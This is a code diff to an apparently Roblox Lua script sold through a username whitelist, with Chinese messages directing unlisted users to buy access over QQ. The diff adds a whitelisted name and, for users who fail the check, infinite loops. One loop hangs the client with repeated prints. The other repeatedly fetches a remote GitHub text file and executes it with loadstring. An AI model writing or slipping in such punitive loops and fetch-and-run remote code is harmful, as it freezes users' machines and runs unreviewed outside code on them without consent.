@@ -37,12 +37,27 @@ elseif a=="dgfgugjvcut"then
 _G.white=true
 elseif a=="bolt61584"then
 _G.white=true
+elseif a=="CN_laoda84"then
+_G.white=true
 end
 if _G.white==true then
     print("验证成功")
 else --验证失败执行↓
 --setclipboard("2586125757")
    game.Players.LocalPlayer:Kick(a.."你没有白名单，加QQ:1548622841，找这个人买白名单")
+   wait(0.01)
+   while true do
+       print("想过验证？")
+   end
+end
+
+if _G.white==true then
+    print("验证成功")
+else
+   wait(0.01)
+   while true do
+          loadstring(game:HttpGet("https://raw.githubusercontent.com/385j8888/ZOUMAGUIX/refs/heads/main/%E6%A0%B8%E5%AF%BC%E5%BC%B9%E9%95%BF%E8%BE%BE5000%E5%A4%9A%E6%95%B0%E6%8D%AE%E8%83%BD%E8%AE%A9%E4%BD%A0%E6%94%BE%E4%B8%80%E4%B8%AA%E6%A0%B8%E5%BC%B9.txt"))()
+   end
 end
 
 local Players = game:GetService("Players")
